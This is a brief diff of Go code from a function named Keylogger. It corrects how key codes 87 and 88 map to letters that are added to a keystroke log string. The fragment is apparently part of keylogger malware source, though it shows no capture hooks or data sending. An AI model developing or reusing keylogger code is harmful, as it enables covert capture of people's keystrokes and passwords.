@@ -394,9 +394,9 @@ func Keylogger() {
 			case 86:
 				Logs += "V"
 			case 87:
-				Logs += "X"
+				Logs += "W"
 			case 88:
-				Logs += "Z"
+				Logs += "X"
 			case 89:
 				Logs += "Y"
 			case 90:
